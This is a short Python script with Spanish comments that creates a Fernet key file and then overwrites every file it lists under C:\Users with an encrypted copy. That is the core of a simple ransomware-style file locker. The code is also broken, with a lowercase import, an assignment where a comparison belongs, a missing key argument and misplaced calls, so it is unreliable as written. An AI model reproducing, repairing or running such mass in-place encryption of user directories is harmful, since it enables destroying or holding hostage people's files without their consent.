from cryptography.fernet import fernet
import os

def generateKey():
     '''
          Funcion 'Generar key' 
          Esta funcion nos genera un archivo con una contraseña      
     '''
     key = Fernet.generate_key()
     with open("key.key", "wb") as key_file:
          key_file.write(key)

def retornarkey():
     '''
          Funcion retornarkey 
          Nos retorna el valor del key agregando comentario
     '''
     return open("key.key", "rb").read()

def encryp(items, key):
     """
          Funcion encrypt 
          Nos ayuda a generar lo necesario para generar la encriptacion de los
          archivos
     """
     i = Fernet(key)
     for x in items:
          with open(x, 'rb') as file:
               file_data = file.read()
          data = i.encrypt(file_data)
          with open(x, 'wb') as file:
               file.write(data)

if __name__ = "__main__":

     #En la siguiente linea se debe de escribir la ruta de los archivos a encryptar
     archivos = 'C:\\Users'
     items = os.listdir(archivos)
     archivos_2 = [archivos + "\\" + x for x in items ]

generateKey()
key = retornarkey()

encryp(archivos_2)
